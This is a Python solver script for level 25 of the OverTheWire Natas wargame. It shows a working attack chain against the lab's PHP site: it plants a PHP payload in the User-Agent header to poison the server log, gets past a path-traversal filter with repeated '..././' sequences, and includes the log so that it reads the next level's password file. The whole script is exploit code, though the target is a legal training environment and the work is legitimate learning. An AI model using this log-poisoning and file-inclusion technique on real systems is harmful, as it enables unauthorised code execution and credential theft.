import requests
import re
from natas_utility import *
import html

current_level = 25
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

url = base_url
headers = {'User-Agent': '<?php echo \'password:\'; include(\'/etc/natas_webpass/natas26\') ?>'}

session = requests.session()

response = session.get(url, auth=auth, headers=headers)

php_sess_id = response.cookies['PHPSESSID']
root_dir = '..././' * 10
natas_log = '/?lang=/{}var/www/natas/natas25/logs/natas25_{}.log'.format(root_dir, php_sess_id)

response_log = session.get(url + natas_log, auth=auth, headers=headers)

content = html.unescape(response_log.content.decode('utf-8')).replace('<br />', '\n')

password_regex = re.compile(r'password:(.+)')
next_password = password_regex.findall(content)[0]
print(next_password)

save_credentials(current_level + 1, next_password)
